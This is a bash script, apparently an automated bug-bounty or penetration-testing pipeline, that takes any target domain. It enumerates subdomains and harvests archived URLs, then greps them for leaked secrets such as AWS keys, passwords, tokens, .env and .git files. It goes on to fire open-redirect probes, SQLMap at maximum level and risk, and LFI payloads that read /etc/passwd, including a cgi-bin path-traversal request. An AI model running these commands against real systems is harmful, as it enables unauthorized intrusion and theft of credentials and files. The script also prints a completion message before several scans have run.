#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <target_domain>"
  exit 1
fi

target_domain=$1

# Amass enumeration
amass enum -d $target_domain -o domains.txt
echo "Amass enumeration completed."

# Subfinder enumeration
subfinder -d $target_domain -o domain1.txt
echo "Subfinder enumeration completed."

# Assetfinder enumeration
assetfinder --subs-only $target_domain > domainss.txt
echo "Assetfinder enumeration completed."

# Combine results into hyper.txt
cat domains.txt domain1.txt domainss.txt > hyper.txt
echo "Combined results into hyper.txt."

# Run httpx on hyper.txt
httpx -l hyper.txt -title -status-code -tech-detect -follow-redirects > httpxinfo.txt
echo "httpx scan completed. Results saved in httpxinfo.txt."

# Filter out 200 status domains and save in new200.txt
cat hyper.txt | httpx -sc -fc 200 > new200.txt
echo "Filtered out 200 status domains. Results saved in new200.txt."

# Run gowitness on new200.txt
gowitness file -f new200.txt --threads 2
echo "Gowitness completed. Screenshots saved in the default location."

# Capture Wayback Machine URLs and save in waybackurls.txt
cat hyper.txt | waybackurls > waybackurls.txt
echo "Captured Wayback Machine URLs. Results saved in waybackurls.txt."

# Extract keywords and save in keywords.txt
grep -oP '(?<=\?|&)\w+(?==|&)' waybackurls.txt | sort -u > keywords.txt
echo "Extracted keywords. Results saved in keywords.txt."

# Fetch additional Wayback Machine URLs and save in waybackurls2.txt
cat hyper.txt | gau --threads 5 > waybackurls2.txt
echo "Fetched additional Wayback Machine URLs. Results saved in waybackurls2.txt."

# Search for sensitive information and save in hiddennew.txt
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp" waybackurls2.txt > hiddennew.txt
echo "Search for sensitive information completed. Results saved in hiddennew.txt."

# Function to create directories for each category
create_category_directories() {
    mkdir -p aws_access_key aws_secret_key api_key passwd pwd heroku slack firebase swagger aws_key password ftp_password jdbc db sql secret_jet config admin json gcp htaccess env ssh_key git access_key secret_token oauth_token oauth_token_secret smtp openvul
}

# Function to move URLs to respective category folders
move_urls_to_categories() {
    while IFS= read -r line; do
        case $line in
            *aws_access_key*) echo "$line" >> aws_access_key/urls.txt ;;
            *aws_secret_key*) echo "$line" >> aws_secret_key/urls.txt ;;
            *api\ key*) echo "$line" >> api_key/urls.txt ;;
            *passwd*) echo "$line" >> passwd/urls.txt ;;
            *pwd*) echo "$line" >> pwd/urls.txt ;;
            *heroku*) echo "$line" >> heroku/urls.txt ;;
            *slack*) echo "$line" >> slack/urls.txt ;;
            *firebase*) echo "$line" >> firebase/urls.txt ;;
            *swagger*) echo "$line" >> swagger/urls.txt ;;
            *aws_key*) echo "$line" >> aws_key/urls.txt ;;
            *password*) echo "$line" >> password/urls.txt ;;
            *ftp\ password*) echo "$line" >> ftp_password/urls.txt ;;
            *jdbc*) echo "$line" >> jdbc/urls.txt ;;
            *db*) echo "$line" >> db/urls.txt ;;
            *sql*) echo "$line" >> sql/urls.txt ;;
            *secret_jet*) echo "$line" >> secret_jet/urls.txt ;;
            *config*) echo "$line" >> config/urls.txt ;;
            *admin*) echo "$line" >> admin/urls.txt ;;
            *json*) echo "$line" >> json/urls.txt ;;
            *gcp*) echo "$line" >> gcp/urls.txt ;;
            *htaccess*) echo "$line" >> htaccess/urls.txt ;;
            *.env*) echo "$line" >> env/urls.txt ;;
            *ssh\ key*) echo "$line" >> ssh_key/urls.txt ;;
            *.git*) echo "$line" >> git/urls.txt ;;
            *access\ key*) echo "$line" >> access_key/urls.txt ;;
            *secret_token*) echo "$line" >> secret_token/urls.txt ;;
            *oauth_token*) echo "$line" >> oauth_token/urls.txt ;;
            *oauth_token_secret*) echo "$line" >> oauth_token_secret/urls.txt ;;
            *smtp*) echo "$line" >> smtp/urls.txt ;;
        esac
    done < hiddennew.txt
}

# Create directories for each category
create_category_directories

# Move URLs to respective category folders
move_urls_to_categories

echo "All enumerations, scans, screenshots, Wayback Machine capture, keyword extraction, additional Wayback Machine URL fetching, sensitive information search, categorization, httpx scan, nuclei scan, LFI vulnerability checks, open redirect check, SQL injection check, and SQLMap scan completed successfully."

# Run a command to check for XSS vulnerabilities using nuclei
cat waybackurls.txt | nuclei -t /root/nuclei-templates/fuzzing-templates
echo "Identified potential XSS vulnerabilities using nuclei."

# Run a command to check for open redirects and save vulnerable URLs in openvul folder
cat waybackurls2.txt | gf redirect | qsreplace "$target_domain" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $target_domain" && echo "VULN! %"' > openvul/urls.txt
echo "Checked for open redirects. Vulnerable URLs saved in openvul/urls.txt."

# Run a command to check for SQL injection vulnerabilities using gf and save in sqli.txt
cat waybackurls.txt | gf sqli >> sqli.txt
echo "Identified potential SQL injection points. Results saved in sqli.txt."

# Run SQLMap on the identified SQL injection points in sqli.txt
sqlmap -m sqli.txt -batch --random-agent --level 5 --risk 3
echo "SQLMap scan completed."

# Run a command to check for LFI vulnerabilities
cat waybackurls2.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
echo "Checked for LFI vulnerabilities."

# Run a command to check for another type of LFI vulnerabilities
cat hyper.txt | while read host; do
  curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n"
done
echo "Checked for another type of LFI vulnerabilities."

# Run a command to check for XSS vulnerabilities using nuclei and then run nuclei with a specific template
cat waybackurls.txt | nuclei -t /root/nuclei-templates/fuzzing-templates
echo "Identified potential XSS vulnerabilities using nuclei."

# ... (Continue adding any additional commands as needed)

echo "All checks and scans completed successfully."
